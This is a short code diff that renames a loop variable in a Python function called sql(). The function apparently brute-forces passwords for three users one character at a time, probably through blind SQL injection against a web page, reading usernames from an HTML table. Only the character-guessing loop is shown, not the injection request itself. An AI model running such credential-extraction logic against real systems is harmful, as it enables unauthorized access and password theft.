@@ -45,9 +45,9 @@ def sql():
     for i in range(1, 4):
         username = None
         pwd = ''
-        flag = True
-        while flag:
-            flag = False
+        more_char = True
+        while more_char:
+            more_char = False
             for j in range(32, 127):
                 char = chr(j) if chr(j) not in special_characters else '[{}]'.format(chr(j))
                 pwd_n = pwd + char
@@ -60,7 +60,7 @@ def sql():
                     pwd = pwd_n
                     if username is None:
                         username = tr_elements[1].find_all('td')[1].contents[0]
-                    flag = True
+                    more_char = True
                     break
         user_pass_list.append({username: pwd})
 
